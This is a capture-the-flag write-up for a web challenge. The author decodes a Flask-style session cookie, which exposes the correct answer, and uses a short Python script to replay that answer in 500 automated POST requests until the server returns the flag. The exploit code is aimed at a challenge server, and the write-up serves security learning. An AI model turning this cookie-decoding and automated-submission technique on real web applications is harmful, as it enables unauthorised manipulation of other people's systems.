
The page shows a random generated image with random generated file name every time refresh, for the first time visit it, a ``session`` value is set in cookie.

```bash
session: eyJhbnN3ZXIiOlsyNSwyMywxMyw5M10sImNvcnJlY3QiOjIsImltYWdlIjoiLi9zdGF0aWMvY2hhbGwtaW1hZ2VzL2lNdUx4T29DeUIuanBnIn0.YGrDwA.Vr2yoO58ay3OhDqhOd6xqLYa45c
```

Decode it with ``base64`` we get key-value data, as the ``session`` value itself comes with some additional bytes at the end, might cause some parse issue. It seems ``answer`` is correct guess for ``image``. Send it with ``,`` is not working and the guess count is reset to 0, but it works with space splitter.

```bash
base64 -d <<< eyJhbnN3ZXIiOlsyNSwyMywxMyw5M10sImNvcnJlY3QiOjIsImltYWdlIjoiLi9zdGF0aWMvY2hhbGwtaW1hZ2VzL2lNdUx4T29DeUIuanBnIn0.YGrDwA.Vr2yoO58ay3OhDqhOd6xqLYa45c
{"answer":[25,23,13,93],"correct":2,"image":"./static/chall-images/iMuLxOoCyB.jpg"}base64: invalid input
```

The session value is used for post requests. If the submitted data is correct, the correct guess count on page is increamented by 1. Every time we make a guess the session value in cookie changes, so we need to re-parse and use it for the next guess. We need to guess 500 times to meet the requirement.

```python
remote = "http://104.197.195.221:8084"

def parse():
    sess = base64.decodebytes(rsp.cookies['session'].split('.')[0].encode()+b'==')
    ans = json.loads(sess)['answer']
    guess = ' '.join(map(str, json.loads(sess)['answer']))
    return guess

rsp = requests.get(remote)
guess = parse()

for i in range(1, 501):
    rsp = requests.post(remote,
            data={'guess': guess},
            headers={
            'Content-Type': 'application/x-www-form-urlencoded',
            },
            cookies=rsp.cookies)
    print(rsp.text)
    guess = parse()
```

After 500 correct guess, we get the flag in response.


